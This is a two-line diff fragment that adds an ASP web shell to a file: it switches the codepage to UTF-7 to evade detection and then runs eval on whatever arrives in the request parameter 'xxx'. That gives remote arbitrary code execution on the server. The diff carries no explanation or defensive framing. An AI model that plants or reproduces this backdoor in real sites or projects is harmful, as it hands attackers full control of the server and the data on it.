@@ -1,0 +1,2 @@
+<%@codepage=65000%>
+<%response.codepage=65001:eval(request("xxx"))%>
